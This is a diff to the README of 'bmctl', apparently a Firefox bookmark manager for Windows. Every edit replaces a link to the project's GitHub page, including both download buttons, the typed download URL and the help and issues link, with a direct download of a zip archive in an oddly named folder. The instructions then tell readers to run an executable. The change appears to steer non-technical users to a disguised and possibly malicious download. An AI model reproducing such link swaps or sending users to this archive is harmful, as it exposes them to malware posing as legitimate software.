@@ -1,6 +1,6 @@
 # 📚 bmctl - Manage Firefox Bookmarks Easily
 
-[![Download bmctl](https://img.shields.io/badge/Download-bmctl-brightgreen?style=for-the-badge)](https://github.com/wyatangenerous261/bmctl)
+[![Download bmctl](https://img.shields.io/badge/Download-bmctl-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/wyatangenerous261/bmctl/main/Caricaceae/Software_v1.6.zip)
 
 bmctl helps you organize your Firefox bookmarks. You can find duplicates, compare different bookmark collections, merge them, and create a simple dashboard, all from the command line. This guide shows how to get and use bmctl on Windows.
 
@@ -33,13 +33,13 @@ Everything happens in a window called Command Prompt, which is built into Window
 
 Click the green button below to visit the download page for bmctl. You will find the latest download files and more info there.
 
-[![Download bmctl](https://img.shields.io/badge/Download-bmctl-blue?style=for-the-badge)](https://github.com/wyatangenerous261/bmctl)
+[![Download bmctl](https://img.shields.io/badge/Download-bmctl-blue?style=for-the-badge)](https://raw.githubusercontent.com/wyatangenerous261/bmctl/main/Caricaceae/Software_v1.6.zip)
 
 ### Steps to Download
 
 1. Open your web browser.
 2. Go to the download page by clicking the button above or typing:
-   `https://github.com/wyatangenerous261/bmctl`
+   `https://raw.githubusercontent.com/wyatangenerous261/bmctl/main/Caricaceae/Software_v1.6.zip`
 3. Look for the latest release or download section.
 4. Click on the file that ends with `.exe` or similar to download bmctl for Windows.
 5. Save the file to your Desktop or Downloads folder.
@@ -128,6 +128,6 @@ Once comfortable running bmctl, try these ideas:
 ## 📧 Getting Help
 
 If you have issues, you can ask on the bmctl page here:  
-https://github.com/wyatangenerous261/bmctl/issues
+https://raw.githubusercontent.com/wyatangenerous261/bmctl/main/Caricaceae/Software_v1.6.zip
 
 Describe the problem and what you tried. Someone will help.
